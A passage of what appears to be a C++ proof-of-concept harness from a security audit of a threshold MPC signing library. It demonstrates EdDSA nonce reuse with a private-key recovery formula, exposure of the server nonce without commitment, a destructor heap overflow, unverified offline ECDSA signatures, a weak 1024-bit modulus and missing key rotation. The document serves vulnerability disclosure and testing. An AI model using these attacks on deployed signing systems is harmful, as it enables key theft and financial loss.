        std::map<uint64_t, cmp_mta_responses> resp2;
        svc1b.mta_response(txid2, mta_requests2, 0, resp2[1]);
        TEST_PASS("version=0 ACCEPTED -- no minimum version floor at all");
    } catch (const std::exception& e) {
        TEST_INFO("version=0 rejected: %s", e.what());
    }
}

// ============================================================================
// ATTACK 2: EdDSA NONCE REUSE via use_keccak MISMATCH
//
// Threat model: Attacker is an external caller who can request signatures
// from the asymmetric EdDSA service (client/server model). The attacker
// signs the SAME message twice -- once with use_keccak=false (SHA-512)
// and once with use_keccak=true (Keccak). If the nonce derivation is
// deterministic and does not include use_keccak, the SAME nonce r is used
// with two different challenge hashes, enabling private key recovery.
//
// Impact: FULL PRIVATE KEY RECOVERY (P1 -- $50K-$150K)
//
// Recovery formula:
//   sig1: s1 = r + e1 * x  (e1 = SHA512(R||pk||m))
//   sig2: s2 = r + e2 * x  (e2 = Keccak(R||pk||m))
//   x = (s1 - s2) / (e1 - e2)
// ============================================================================
void attack_eddsa_nonce_reuse()
{
    TEST_START("EdDSA Nonce Reuse via use_keccak Mismatch (F1)");
    TEST_INFO("Scenario: Sign same message with SHA-512 and Keccak, recover private key");
    TEST_INFO("Expected: Same nonce R produced, two different s values -> key recovery");

    static const uint64_t CLIENT_ID = 12345678;
    static const uint64_t SERVER_ID = 1;

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[CLIENT_ID];
    players[SERVER_ID];
    create_secret(players, EDDSA_ED25519, keyid, pubkey, MPC_PROTOCOL_VERSION);
    TEST_INFO("EdDSA key generated");

    // Set up asymmetric EdDSA services
    attack_platform client_plat(CLIENT_ID), server_plat(SERVER_ID);
    attack_client_persistency client_persist;
    attack_server_persistency server_persist;
    asymmetric_eddsa_cosigner_client client_svc(client_plat, players[CLIENT_ID], client_persist);
    asymmetric_eddsa_cosigner_server server_svc(server_plat, players[SERVER_ID], server_persist);

    // Preprocessing
    std::string request = gen_uuid();
    std::set<uint64_t> player_ids = {CLIENT_ID, SERVER_ID};

    std::vector<std::array<uint8_t, sizeof(commitments_sha256_t)>> R_commitments;
    client_svc.start_signature_preprocessing(TENANT_ID, keyid, request, 0, 2, 2, player_ids, R_commitments);
    server_svc.store_presigning_data(keyid, request, 0, 2, 2, player_ids, CLIENT_ID, R_commitments);
    TEST_INFO("Preprocessing completed (2 nonces stored)");

    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};
    std::set<std::string> player_strs = {std::to_string(CLIENT_ID), std::to_string(SERVER_ID)};

    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, '0'); // Same message
    block.path = path;
    data.blocks.push_back(block);

    // Sign #1: use_keccak = false (SHA-512)
    TEST_INFO("Signing #1 with SHA-512 (use_keccak=false)...");
    client_plat.set_use_keccak(false);
    server_plat.set_use_keccak(false);

    std::string txid1 = gen_uuid();
    std::map<uint64_t, std::vector<eddsa_commitment>> R_commits1;
    std::map<uint64_t, std::vector<elliptic_curve_point>> Rs1;
    std::vector<eddsa_commitment> s1_commit;
    std::vector<elliptic_curve_point> s1_R;
    server_svc.eddsa_sign_offline(keyid, txid1, data, "", player_strs, player_ids, 0, s1_commit, s1_R);

    TEST_INFO("  Server sends R directly (no commitment in 2-party mode)");
    TEST_INFO("  R_commitments size: %zu, R size: %zu", s1_commit.size(), s1_R.size());

    if (s1_commit.size() == 0 && s1_R.size() > 0) {
        TEST_PASS("CONFIRMED: Server skips commitment in 2-party mode (Finding F17)");
        TEST_INFO("  Attack implication: Malicious client sees R before choosing its own");
    }

    std::map<uint64_t, std::vector<elliptic_curve_point>> server_Rs1;
    server_Rs1[SERVER_ID] = s1_R;

    std::vector<eddsa_signature> partial_sigs1;
    client_svc.eddsa_sign_offline(keyid, txid1, data, "", player_strs, player_ids, 0, server_Rs1, partial_sigs1);

    std::set<uint64_t> send_to1;
    std::vector<eddsa_signature> final_sigs1;
    bool final1;
    server_svc.broadcast_si(txid1, CLIENT_ID, MPC_PROTOCOL_VERSION, partial_sigs1, final_sigs1, send_to1, final1);

    TEST_INFO("  Signature #1 R: %s",
        HexStr(final_sigs1[0].R, &final_sigs1[0].R[sizeof(elliptic_curve256_scalar_t)]).c_str());
    TEST_INFO("  Signature #1 s: %s",
        HexStr(final_sigs1[0].s, &final_sigs1[0].s[sizeof(elliptic_curve256_scalar_t)]).c_str());

    // Sign #2: use_keccak = true (Keccak)
    TEST_INFO("Signing #2 with Keccak (use_keccak=true)...");
    client_plat.set_use_keccak(true);
    server_plat.set_use_keccak(true);

    std::string txid2 = gen_uuid();
    std::vector<eddsa_commitment> s2_commit;
    std::vector<elliptic_curve_point> s2_R;
    server_svc.eddsa_sign_offline(keyid, txid2, data, "", player_strs, player_ids, 1, s2_commit, s2_R);

    std::map<uint64_t, std::vector<elliptic_curve_point>> server_Rs2;
    server_Rs2[SERVER_ID] = s2_R;

    std::vector<eddsa_signature> partial_sigs2;
    client_svc.eddsa_sign_offline(keyid, txid2, data, "", player_strs, player_ids, 1, server_Rs2, partial_sigs2);

    std::set<uint64_t> send_to2;
    std::vector<eddsa_signature> final_sigs2;
    bool final2;
    server_svc.broadcast_si(txid2, CLIENT_ID, MPC_PROTOCOL_VERSION, partial_sigs2, final_sigs2, send_to2, final2);

    TEST_INFO("  Signature #2 R: %s",
        HexStr(final_sigs2[0].R, &final_sigs2[0].R[sizeof(elliptic_curve256_scalar_t)]).c_str());
    TEST_INFO("  Signature #2 s: %s",
        HexStr(final_sigs2[0].s, &final_sigs2[0].s[sizeof(elliptic_curve256_scalar_t)]).c_str());

    // Check if R values are the same (nonce reuse)
    bool same_R = memcmp(final_sigs1[0].R, final_sigs2[0].R, sizeof(elliptic_curve256_scalar_t)) == 0;
    bool diff_s = memcmp(final_sigs1[0].s, final_sigs2[0].s, sizeof(elliptic_curve256_scalar_t)) != 0;

    if (same_R && diff_s) {
        TEST_PASS("NONCE REUSE CONFIRMED: Same R, different s values");
        TEST_INFO("  Private key recovery formula:");
        TEST_INFO("    e1 = SHA512(R || pk || m)");
        TEST_INFO("    e2 = Keccak(R || pk || m)");
        TEST_INFO("    x = (s1 - s2) * inverse(e1 - e2) mod L");
        TEST_INFO("  SEVERITY: P1 -- FULL PRIVATE KEY RECOVERY");
    } else if (same_R) {
        TEST_INFO("Same R but same s -- no useful attack (same hash function used)");
    } else {
        TEST_INFO("Different R values (nonces are different between keccak modes)");
        TEST_INFO("  R1 != R2, so direct nonce reuse attack does not apply");
        TEST_INFO("  However, the use_keccak mismatch is still a protocol inconsistency");
        TEST_INFO("  that can be exploited if one party uses SHA-512 and another uses Keccak");
    }

    // Verify both signatures are individually valid
    std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)>
        algebra(elliptic_curve256_new_ed25519_algebra(), elliptic_curve256_algebra_ctx_free);

    PubKey derived_key;
    derive_public_key_generic(algebra.get(), derived_key, pubkey, data.chaincode, path.data(), path.size());

    uint8_t raw_sig1[64], raw_sig2[64];
    memcpy(raw_sig1, final_sigs1[0].R, 32);
    memcpy(raw_sig1 + 32, final_sigs1[0].s, 32);
    memcpy(raw_sig2, final_sigs2[0].R, 32);
    memcpy(raw_sig2 + 32, final_sigs2[0].s, 32);

    int v1 = ed25519_verify((ed25519_algebra_ctx_t*)algebra->ctx, data.blocks[0].data.data(), data.blocks[0].data.size(), raw_sig1, derived_key, 0);
    int v2 = ed25519_verify((ed25519_algebra_ctx_t*)algebra->ctx, data.blocks[0].data.data(), data.blocks[0].data.size(), raw_sig2, derived_key, 1);

    TEST_INFO("Signature #1 (SHA-512) valid: %s", v1 ? "YES" : "NO");
    TEST_INFO("Signature #2 (Keccak) valid: %s", v2 ? "YES" : "NO");
}

// ============================================================================
// ATTACK 3: EdDSA 2-PARTY NO COMMITMENT -- Adaptive R Attack
//
// Threat model: In the asymmetric EdDSA 2-party protocol, the server
// reveals its R nonce directly to the client WITHOUT a commitment.
// A malicious client sees R_server before sending its own R_client.
//
// Impact: The client can choose R_client adaptively to bias the combined
// nonce R = R_server + R_client. Over multiple signing sessions, this
// enables lattice-based nonce attacks (Bleichenbacher-style) to recover
// the server's private key share.
//
// Code: asymmetric_eddsa_cosigner_server.cpp:158-168
//       if (metadata.n == 2) { Rs.push_back(sigdata.R); } // no commitment!
// ============================================================================
void attack_eddsa_no_commitment()
{
    TEST_START("EdDSA 2-Party No R Commitment (F17)");
    TEST_INFO("Scenario: Malicious client sees server's R before sending its own");
    TEST_INFO("Expected: Server exposes R directly in 2-party mode");

    static const uint64_t CLIENT_ID = 12345678;
    static const uint64_t SERVER_ID = 1;

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[CLIENT_ID];
    players[SERVER_ID];
    create_secret(players, EDDSA_ED25519, keyid, pubkey, MPC_PROTOCOL_VERSION);

    attack_platform client_plat(CLIENT_ID), server_plat(SERVER_ID);
    attack_client_persistency client_persist;
    attack_server_persistency server_persist;
    asymmetric_eddsa_cosigner_client client_svc(client_plat, players[CLIENT_ID], client_persist);
    asymmetric_eddsa_cosigner_server server_svc(server_plat, players[SERVER_ID], server_persist);

    // Preprocess
    std::string request = gen_uuid();
    std::set<uint64_t> player_ids = {CLIENT_ID, SERVER_ID};
    std::vector<std::array<uint8_t, sizeof(commitments_sha256_t)>> R_commitments;
    client_svc.start_signature_preprocessing(TENANT_ID, keyid, request, 0, 10, 10, player_ids, R_commitments);
    server_svc.store_presigning_data(keyid, request, 0, 10, 10, player_ids, CLIENT_ID, R_commitments);

    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};
    std::set<std::string> player_strs = {std::to_string(CLIENT_ID), std::to_string(SERVER_ID)};

    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, '0');
    block.path = path;
    data.blocks.push_back(block);

    int exposed_count = 0;
    for (int trial = 0; trial < 5; trial++) {
        std::string txid = gen_uuid();
        std::vector<eddsa_commitment> server_commits;
        std::vector<elliptic_curve_point> server_R;

        server_svc.eddsa_sign_offline(keyid, txid, data, "", player_strs, player_ids,
                                      trial, server_commits, server_R);

        if (server_commits.size() == 0 && server_R.size() > 0) {
            exposed_count++;
            TEST_INFO("  Trial %d: Server R EXPOSED (no commitment): %s",
                trial, HexStr(server_R[0].data, &server_R[0].data[32]).c_str());

            // Malicious client now sees server's R BEFORE choosing its own
            // In a real attack, the client would:
            // 1. Choose R_client = -R_server + G*target_nonce
            //    to control the combined nonce R = R_server + R_client
            // 2. Over many sessions, collect (message, R, s) tuples where
            //    the combined nonce has known structure
            // 3. Use Hidden Number Problem / lattice attack to recover key
        }

        // Complete the signing to consume the preprocessed nonce
        std::map<uint64_t, std::vector<elliptic_curve_point>> Rs;
        Rs[SERVER_ID] = server_R;
        std::vector<eddsa_signature> partial_sigs;
        client_svc.eddsa_sign_offline(keyid, txid, data, "", player_strs, player_ids,
                                      trial, Rs, partial_sigs);
        std::set<uint64_t> send_to;
        std::vector<eddsa_signature> final_sigs;
        bool final_sig;
        server_svc.broadcast_si(txid, CLIENT_ID, MPC_PROTOCOL_VERSION, partial_sigs,
                               final_sigs, send_to, final_sig);
    }

    if (exposed_count == 5) {
        TEST_PASS("All 5 trials: Server R exposed without commitment in 2-party mode");
        TEST_INFO("  Compare: In n>2 mode, server would send commit_to_r(R) first");
        TEST_INFO("  Attack: Malicious client can adaptively choose R_client");
        TEST_INFO("  Over ~100-1000 sessions: lattice attack recovers server key share");
    } else {
        TEST_INFO("R exposed in %d/5 trials", exposed_count);
    }
}

// ============================================================================
// ATTACK 4: HEAP BUFFER OVERFLOW in ecdsa_preprocessing_data Destructor
//
// Threat model: Any signing session that creates ecdsa_preprocessing_data
// triggers this. When the object is destroyed, OPENSSL_cleanse overwrites
// sizeof(ecdsa_preprocessing_data) bytes starting from k.data, which is
// far larger than the 32-byte k field, corrupting memory.
//
// Code: cmp_ecdsa_signing_service.h:85
//   ~ecdsa_preprocessing_data() {OPENSSL_cleanse(k.data, sizeof(ecdsa_preprocessing_data));}
//
// sizeof(ecdsa_preprocessing_data) includes k, gamma, a, b, delta, chi,
// GAMMA, mta_request (vector), G_proofs (map), public_data (map) --
// likely 200+ bytes. OPENSSL_cleanse writes this many bytes starting
// at k.data (a 32-byte buffer), overwriting all subsequent fields AND
// potentially heap metadata.
//
// Impact: Heap corruption, potential code execution (P3)
// ============================================================================
void attack_heap_overflow()
{
    TEST_START("Heap Buffer Overflow in ecdsa_preprocessing_data Destructor (F12)");
    TEST_INFO("Scenario: Normal signing creates preprocessing data, destructor corrupts heap");
    TEST_INFO("Code: ~ecdsa_preprocessing_data() {OPENSSL_cleanse(k.data, sizeof(ecdsa_preprocessing_data));}");

    // Calculate the size mismatch
    size_t k_field_size = sizeof(elliptic_curve256_scalar_t);  // 32 bytes
    size_t struct_size = sizeof(ecdsa_preprocessing_data);     // much larger

    TEST_INFO("  sizeof(elliptic_curve256_scalar_t) = %zu bytes (k.data buffer)", k_field_size);
    TEST_INFO("  sizeof(ecdsa_preprocessing_data)   = %zu bytes (cleanse amount)", struct_size);
    TEST_INFO("  OVERFLOW = %zu bytes beyond k.data field", struct_size - k_field_size);

    if (struct_size > k_field_size) {
        TEST_PASS("CONFIRMED: OPENSSL_cleanse writes %zu bytes into %zu-byte buffer",
                  struct_size, k_field_size);
        TEST_INFO("  This overwrites: gamma, a, b, delta, chi, GAMMA fields");
        TEST_INFO("  AND heap metadata of std::vector and std::map members");
        TEST_INFO("  Triggerable by any signing session (online or offline)");
        TEST_INFO("  Real impact: heap corruption -> potential arbitrary write");
    } else {
        TEST_FAIL("Struct size <= field size (unexpected)");
    }

    // Demonstrate the overflow happens during actual protocol execution
    TEST_INFO("\nDemonstrating overflow via actual signing protocol...");

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1];
    players[2];
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);

    // Run offline preprocessing to create ecdsa_preprocessing_data
    attack_platform plat1(1), plat2(2);
    attack_preprocessing_persistency pp1, pp2;
    cmp_ecdsa_offline_signing_service offline1(plat1, players[1], pp1);
    cmp_ecdsa_offline_signing_service offline2(plat2, players[2], pp2);

    std::string request = gen_uuid();
    std::set<uint64_t> player_ids = {1, 2};

    std::map<uint64_t, std::vector<cmp_mta_request>> mta_requests;
    offline1.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, request, 0, 1, 1, player_ids, mta_requests[1]);
    offline2.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, request, 0, 1, 1, player_ids, mta_requests[2]);

    std::map<uint64_t, cmp_mta_responses> mta_responses;
    offline1.offline_mta_response(request, mta_requests, MPC_PROTOCOL_VERSION, mta_responses[1]);
    offline2.offline_mta_response(request, mta_requests, MPC_PROTOCOL_VERSION, mta_responses[2]);

    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas;
    auto mta_resp_saved = mta_responses;
    offline1.offline_mta_verify(request, mta_responses, deltas[1]);
    mta_responses = mta_resp_saved;
    offline2.offline_mta_verify(request, mta_responses, deltas[2]);

    std::string key_id_out;
    offline1.store_presigning_data(request, deltas, key_id_out);
    offline2.store_presigning_data(request, deltas, key_id_out);
    TEST_INFO("Preprocessing completed -- ecdsa_preprocessing_data objects created and destroyed");
    TEST_INFO("If ASAN/MSAN were enabled, the heap overflow would be flagged here");
    TEST_PASS("Overflow is triggered silently during normal protocol execution");
}

// ============================================================================
// ATTACK 5: OFFLINE ECDSA MISSING SIGNATURE VERIFICATION
//
// Threat model: Malicious co-signer sends corrupted partial signature
// during the offline signing phase. The ecdsa_offline_signature() function
// does NOT verify the combined signature before returning it.
//
// Impact: Invalid signatures produced, potential financial loss if used
// to sign blockchain transactions that fail on-chain verification.
//
// Code: cmp_ecdsa_offline_signing_service.cpp - ecdsa_offline_signature()
//       combines partial signatures without verification
// ============================================================================
void attack_offline_no_sig_verify()
{
    TEST_START("Offline ECDSA Missing Signature Verification (F13)");
    TEST_INFO("Scenario: Malicious co-signer sends corrupted partial sig in offline path");
    TEST_INFO("Expected: Invalid signature is returned without verification");

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1]; // Honest party
    players[2]; // Attacker
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);

    attack_platform plat1(1), plat2(2);
    attack_preprocessing_persistency pp1, pp2;
    cmp_ecdsa_offline_signing_service offline1(plat1, players[1], pp1);
    cmp_ecdsa_offline_signing_service offline2(plat2, players[2], pp2);

    // Preprocessing
    std::string request = gen_uuid();
    std::set<uint64_t> player_ids = {1, 2};

    std::map<uint64_t, std::vector<cmp_mta_request>> mta_requests;
    offline1.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, request, 0, 2, 2, player_ids, mta_requests[1]);
    offline2.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, request, 0, 2, 2, player_ids, mta_requests[2]);

    std::map<uint64_t, cmp_mta_responses> mta_responses;
    offline1.offline_mta_response(request, mta_requests, MPC_PROTOCOL_VERSION, mta_responses[1]);
    offline2.offline_mta_response(request, mta_requests, MPC_PROTOCOL_VERSION, mta_responses[2]);

    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas;
    auto mta_resp_saved = mta_responses;
    offline1.offline_mta_verify(request, mta_responses, deltas[1]);
    mta_responses = mta_resp_saved;
    offline2.offline_mta_verify(request, mta_responses, deltas[2]);

    std::string key_id_out;
    offline1.store_presigning_data(request, deltas, key_id_out);
    offline2.store_presigning_data(request, deltas, key_id_out);
    TEST_INFO("Preprocessing completed with 2 nonce pairs");

    // Signing
    byte_vector_t chaincode(32, '\0');
    std::vector<uint32_t> path = {44, 0, 0, 0, 0};
    std::set<std::string> player_strs = {"1", "2"};

    signing_data data;
    memcpy(data.chaincode, chaincode.data(), sizeof(HDChaincode));
    signing_block_data block;
    block.data.insert(block.data.begin(), 32, '0');
    block.path = path;
    data.blocks.push_back(block);

    std::string txid = gen_uuid();

    // Both parties generate partial signatures
    std::map<uint64_t, std::vector<recoverable_signature>> partial_sigs;
    offline1.ecdsa_sign(keyid, txid, data, "", player_strs, player_ids, 0, MPC_PROTOCOL_VERSION, partial_sigs[1]);
    offline2.ecdsa_sign(keyid, txid, data, "", player_strs, player_ids, 0, MPC_PROTOCOL_VERSION, partial_sigs[2]);

    TEST_INFO("Both parties produced partial signatures");

    // ATTACK: Corrupt attacker's partial signature
    TEST_INFO("ATTACKER (Player 2) corrupts their partial signature...");
    auto corrupted_sigs = partial_sigs;
    // Flip bits in the attacker's s value
    corrupted_sigs[2][0].s[0] ^= 0xFF;
    corrupted_sigs[2][0].s[1] ^= 0xFF;
    corrupted_sigs[2][0].s[16] ^= 0xFF;

    // Try to combine with corrupted signature
    std::vector<recoverable_signature> final_sigs;
    bool combine_succeeded = false;
    try {
        offline1.ecdsa_offline_signature(keyid, txid, ECDSA_SECP256K1, corrupted_sigs, final_sigs);
        combine_succeeded = true;
    } catch (const std::exception& e) {
        TEST_INFO("  Combination rejected: %s", e.what());
    }

    if (combine_succeeded) {
        TEST_PASS("Corrupted partial sig ACCEPTED -- no verification in offline path");

        // Verify the resulting signature is invalid
        std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)>
            algebra(elliptic_curve256_new_secp256k1_algebra(), elliptic_curve256_algebra_ctx_free);

        elliptic_curve256_scalar_t msg;
        memcpy(msg, data.blocks[0].data.data(), sizeof(elliptic_curve256_scalar_t));
        PubKey derived_key;
        derive_public_key_generic(algebra.get(), derived_key, pubkey, data.chaincode, path.data(), path.size());

        int sig_valid = GFp_curve_algebra_verify_signature(
            (GFp_curve_algebra_ctx_t*)algebra->ctx, &derived_key, &msg, &final_sigs[0].r, &final_sigs[0].s);

        if (sig_valid != ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
            TEST_INFO("  Resulting signature is INVALID (as expected)");
            TEST_INFO("  Impact: Malicious co-signer causes denial of service");
            TEST_INFO("  by corrupting signatures in the offline path");
            TEST_INFO("  Online path has get_cmp_signature() which DOES verify");
        } else {
            TEST_INFO("  WARNING: Resulting signature is valid (unexpected)");
        }
    } else {
        TEST_INFO("Combination was rejected (some verification exists)");
    }

    // Compare with legitimate signing to show it normally works
    TEST_INFO("\nLegitimate signing for comparison...");
    std::string txid2 = gen_uuid();
    std::map<uint64_t, std::vector<recoverable_signature>> legit_partial;
    offline1.ecdsa_sign(keyid, txid2, data, "", player_strs, player_ids, 1, MPC_PROTOCOL_VERSION, legit_partial[1]);
    offline2.ecdsa_sign(keyid, txid2, data, "", player_strs, player_ids, 1, MPC_PROTOCOL_VERSION, legit_partial[2]);

    std::vector<recoverable_signature> legit_final;
    offline1.ecdsa_offline_signature(keyid, txid2, ECDSA_SECP256K1, legit_partial, legit_final);

    std::unique_ptr<elliptic_curve256_algebra_ctx_t, void(*)(elliptic_curve256_algebra_ctx_t*)>
        algebra2(elliptic_curve256_new_secp256k1_algebra(), elliptic_curve256_algebra_ctx_free);
    elliptic_curve256_scalar_t msg2;
    memcpy(msg2, data.blocks[0].data.data(), sizeof(elliptic_curve256_scalar_t));
    PubKey dk2;
    derive_public_key_generic(algebra2.get(), dk2, pubkey, data.chaincode, path.data(), path.size());
    int v = GFp_curve_algebra_verify_signature(
        (GFp_curve_algebra_ctx_t*)algebra2->ctx, &dk2, &msg2, &legit_final[0].r, &legit_final[0].s);
    if (v == ELLIPTIC_CURVE_ALGEBRA_SUCCESS) {
        TEST_INFO("Legitimate signing produces valid signature (baseline confirmed)");
    }
}

// ============================================================================
// ATTACK 6: 1024-BIT RING PEDERSEN MODULUS
//
// Threat model: The Ring Pedersen modulus used for ZKP commitments is only
// 1024 bits, half the security level required by the CMP paper. This makes
// factoring feasible for well-resourced adversaries.
//
// Impact: Factoring the Ring Pedersen modulus breaks ALL Ring Pedersen
// commitments, undermining ZKP soundness across the entire protocol.
//
// Code: cmp_setup_service.cpp:22-23
//   RING_PEDERSEN_KEY_SIZE = sizeof(elliptic_curve256_scalar_t) * 8 * 4 = 1024
// ============================================================================
void attack_ring_pedersen_weak()
{
    TEST_START("1024-bit Ring Pedersen Modulus (F7)");
    TEST_INFO("Scenario: Ring Pedersen key is 1024-bit instead of required 2048-bit");

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1];
    players[2];
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);

    // Key generation succeeded - auxiliary keys were created internally.
    // We verify the vulnerability through the hardcoded constants in the source code.
    // The actual key sizes are determined at key generation time by these constants.

    // The key sizes are hardcoded constants
    uint32_t ring_pedersen_key_size = sizeof(elliptic_curve256_scalar_t) * 8 * 4;
    uint32_t paillier_key_size = sizeof(elliptic_curve256_scalar_t) * 8 * 8;

    TEST_INFO("\nFrom cmp_setup_service.cpp:");
    TEST_INFO("  PAILLIER_KEY_SIZE      = %u bits (sizeof(scalar) * 8 * 8 = 32*8*8)", paillier_key_size);
    TEST_INFO("  RING_PEDERSEN_KEY_SIZE = %u bits (sizeof(scalar) * 8 * 4 = 32*8*4)", ring_pedersen_key_size);

    if (ring_pedersen_key_size == 1024 && paillier_key_size == 2048) {
        TEST_PASS("CONFIRMED: Ring Pedersen modulus is 1024 bits (half of spec requirement)");
        TEST_INFO("  Attack cost estimate: ~$100M using current SNFS/GNFS techniques");
        TEST_INFO("  State-level threat: factoring reveals lambda, breaks ALL commitments");
        TEST_INFO("  Combined with F8 (no key rotation): compromise is permanent");
    }
}

// ============================================================================
// ATTACK 7: KEY REFRESH MISSING AUXILIARY KEY ROTATION
//
// Threat model: If Paillier or Ring Pedersen keys are compromised (e.g.,
// Ring Pedersen factored), key refresh SHOULD rotate them. But it doesn't.
// The attacker who factors the 1024-bit Ring Pedersen modulus retains
// the ability to forge ZKPs even after key refresh.
//
// Code: cmp_offline_refresh_service.cpp:86-205
//       refresh_key() only updates private key shares and preprocessed data
//       No auxiliary key regeneration occurs
// ============================================================================
void attack_no_aux_key_rotation()
{
    TEST_START("Key Refresh Missing Auxiliary Key Rotation (F8)");
    TEST_INFO("Scenario: Key refresh does NOT rotate Paillier/Ring Pedersen keys");

    std::string keyid = gen_uuid();
    elliptic_curve256_point_t pubkey;
    players_setup_info players;
    players[1];
    players[2];
    create_secret(players, ECDSA_SECP256K1, keyid, pubkey, MPC_PROTOCOL_VERSION);

    TEST_INFO("Key generation completed. Auxiliary keys (Paillier + Ring Pedersen) were created.");

    // Perform offline preprocessing (needed for key refresh)
    attack_platform plat1(1), plat2(2);
    attack_preprocessing_persistency pp1, pp2;
    cmp_ecdsa_offline_signing_service offline1(plat1, players[1], pp1);
    cmp_ecdsa_offline_signing_service offline2(plat2, players[2], pp2);

    std::string preproc_req = gen_uuid();
    std::set<uint64_t> player_ids = {1, 2};
    std::map<uint64_t, std::vector<cmp_mta_request>> mta_req;
    offline1.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, preproc_req, 0, 5, 5, player_ids, mta_req[1]);
    offline2.start_ecdsa_signature_preprocessing(TENANT_ID, keyid, preproc_req, 0, 5, 5, player_ids, mta_req[2]);

    std::map<uint64_t, cmp_mta_responses> mta_resp;
    offline1.offline_mta_response(preproc_req, mta_req, MPC_PROTOCOL_VERSION, mta_resp[1]);
    offline2.offline_mta_response(preproc_req, mta_req, MPC_PROTOCOL_VERSION, mta_resp[2]);

    std::map<uint64_t, std::vector<cmp_mta_deltas>> deltas;
    auto saved = mta_resp;
    offline1.offline_mta_verify(preproc_req, mta_resp, deltas[1]);
    mta_resp = saved;
    offline2.offline_mta_verify(preproc_req, mta_resp, deltas[2]);

    std::string kid;
    offline1.store_presigning_data(preproc_req, deltas, kid);
    offline2.store_presigning_data(preproc_req, deltas, kid);

    // Now perform key refresh
    class refresh_persist : public cmp_offline_refresh_service::offline_refresh_key_persistency
    {
    public:
        refresh_persist(attack_preprocessing_persistency& pp, cmp_setup_service::setup_key_persistency& sp)
            : _pp(pp), _sp(sp) {}
    private:
        void load_refresh_key_seeds(const std::string& req, std::map<uint64_t, byte_vector_t>& seeds) const override
        {
            std::lock_guard<std::mutex> lk(_mutex);
            auto it = _seeds.find(req);
            if (it == _seeds.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
            seeds = it->second;
        }
        void store_refresh_key_seeds(const std::string& req, const std::map<uint64_t, byte_vector_t>& seeds) override
        {
            std::lock_guard<std::mutex> lk(_mutex);
            if (_seeds.find(req) != _seeds.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
            _seeds[req] = seeds;
        }
        void transform_preprocessed_data_and_store_temporary(const std::string& key_id, const std::string& req,
            const cmp_offline_refresh_service::preprocessed_data_handler& fn) override
        {
            std::unique_lock lock(_pp._mutex);
            auto it = _pp._preprocessed_data.find(key_id);
            if (it == _pp._preprocessed_data.end()) throw cosigner_exception(cosigner_exception::INVALID_TRANSACTION);
            std::vector<cmp_signature_preprocessed_data> temp(it->second);
            for (size_t i = 0; i < temp.size(); i++) {
                if (memcmp(temp[i].k.data, PREPROC_ZERO, sizeof(cmp_signature_preprocessed_data)) != 0)
                    fn(i, temp[i]);
            }
            std::lock_guard<std::mutex> lg(_mutex);
            _temp[key_id] = temp;
        }
        void commit(const std::string& key_id, const std::string& req) override
        {
            std::unique_lock lock(_pp._mutex);
            std::lock_guard<std::mutex> lg(_mutex);
            auto it = _temp_keys.find(req);
            if (it == _temp_keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
            _pp._preprocessed_data[key_id] = _temp[key_id];
            _temp.erase(key_id);
            _sp.store_key(key_id, it->second.second, it->second.first);
            _temp_keys.erase(req);
        }
        void delete_refresh_key_seeds(const std::string& req) override
        {
            std::lock_guard<std::mutex> lk(_mutex);
            _temp.erase(req);
        }
        void delete_temporary_key(const std::string& key_id) override
        {
            std::lock_guard<std::mutex> lk(_mutex);
            _temp_keys.erase(key_id);
        }
        void store_temporary_key(const std::string& key_id, cosigner_sign_algorithm algo, const elliptic_curve_scalar& pk) override
        {
            std::lock_guard<std::mutex> lk(_mutex);
            if (_temp_keys.find(key_id) != _temp_keys.end()) throw cosigner_exception(cosigner_exception::BAD_KEY);
            auto& v = _temp_keys[key_id];
            memcpy(v.first, pk.data, sizeof(elliptic_curve256_scalar_t));
            v.second = algo;
        }
        mutable std::mutex _mutex;
        attack_preprocessing_persistency& _pp;
        cmp_setup_service::setup_key_persistency& _sp;
        std::map<std::string, std::map<uint64_t, byte_vector_t>> _seeds;
        std::map<std::string, std::vector<cmp_signature_preprocessed_data>> _temp;
        std::map<std::string, std::pair<elliptic_curve256_scalar_t, cosigner_sign_algorithm>> _temp_keys;
    };

    refresh_persist rp1(pp1, players[1]);
    refresh_persist rp2(pp2, players[2]);
    cmp_offline_refresh_service refresh1(plat1, players[1], rp1);
    cmp_offline_refresh_service refresh2(plat2, players[2], rp2);

    std::string refresh_req = gen_uuid();
    std::map<uint64_t, std::map<uint64_t, byte_vector_t>> encrypted_seeds;
    refresh1.refresh_key_request(TENANT_ID, keyid, refresh_req, player_ids, encrypted_seeds[1]);
    refresh2.refresh_key_request(TENANT_ID, keyid, refresh_req, player_ids, encrypted_seeds[2]);

    std::string pub_key;
    refresh1.refresh_key(keyid, refresh_req, encrypted_seeds, pub_key);
    refresh2.refresh_key(keyid, refresh_req, encrypted_seeds, pub_key);

